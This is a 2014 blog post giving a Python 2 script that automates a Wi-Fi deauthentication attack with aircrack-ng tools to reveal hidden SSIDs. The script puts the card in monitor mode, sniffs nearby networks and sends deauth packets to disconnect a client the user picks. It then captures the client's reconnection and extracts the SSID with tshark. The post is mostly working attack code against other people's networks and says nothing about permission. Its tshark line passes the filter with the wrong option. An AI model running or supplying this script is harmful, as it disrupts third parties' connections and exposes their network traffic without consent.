---           
layout: post
title: Python script : SSID sniffer, De-auth attack and Packets capturing using Aircrack-ng and tshark 
date: 2014-09-10 19:46:43 UTC
updated: 2014-09-10 19:46:43 UTC
comments: false
categories: 
---

I was asked by my friend, Atikah to write some Python scripts for her final year project. The project involves discovering the hidden SSID of surrounding Wifi networks. Getting the non-hidden SSID is a matter of turning on the wireless card. For hidden SSID, the trick is to capture the authorization packets sent by the connected client to that Wifi network and get the SSID from the packet. <br /><br />To do, we do "De-Auth attack" on that specific client. As a result, we disconnect it from the Wifi network. Once it's disconnected, it will try to reconnect to the Wifi network automatically by sending the "authorization" packets to that Wifi's Access Point.<br /><br />We then capture these packets and analyse it for information.<br /><br /><span style="font-family: Courier New, Courier, monospace;"><b>#!/usr/bin/env python</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">import os</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>from time import sleep</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">print "1 - Put the wireless card to monitor mode."</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "2 - Sniff for surrounding wireless network and list all BSSIDs"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "3 - Perform deAuth attack to a client from an AP"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "4 - Capture packets into a file and examine it (if "</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print " "</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "IMPORTANT NOTE: Press CNTRL+C to stop both the sniffing process and packets capture process"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>sleep(5) #pause for 3 seconds so user can read the info</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">try:</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; os.system("airmon-ng start wlan0") #set wireless card to monitor mode</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; sleep(5) #pause for 5 seconds so user can read the info</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; print "wireless card is set to monitor mode. Start sniffing..."</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; os.system("airodump-ng mon0") #start probing local wireless network</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>except KeyboardInterrupt:</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; print "nothing";</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">print "Sniffing process stopped."</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "Lets start deAuth attack. Pick an AP and a connected client"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>bssid = raw_input("Enter the MAC address of the hidden SSID of an AP (BSSID) : ")</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>station = raw_input("Enter the MAC address of connected client (STATION) : ")</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">try:</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; print "Start deAuth attack..."</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; os.system("aireplay-ng --deauth 10 -a %s -c %s mon0 --ignore-negative-one" % (bssid, station)) #send deAuth packets to the AP</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>except KeyboardInterrupt:</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; print "nothing";</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">print " "</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "deAuth attack is stopped. At this point, the client is trying to re-authenticate with the AP"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "Lets capture the packets"</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>sleep(5) #pause for 3 seconds so user can read the info</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">try:</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; os.system("airodump-ng --bssid %s -w captured_packet mon0" %(bssid))</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>except KeyboardInterrupt:</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>&nbsp; &nbsp; print "nothing"</b></span><br /><b><span style="font-family: Courier New, Courier, monospace;"><br /></span><span style="font-family: Courier New, Courier, monospace;">print "The captured packets are saved to a file in the same directory - captured_packet.cap"</span></b><br /><span style="font-family: Courier New, Courier, monospace;"><b>print " "</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "Displaying the first 20 captured packets..."</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>os.system("tshark -r 'wlan.bssid == %s' -r captured_packet-01.cap | grep SSID | sed 's/^.*SSID=//' | sort | uniq" % bssid)</b></span><br /><span style="font-family: Courier New, Courier, monospace;"><b>print "end"</b></span>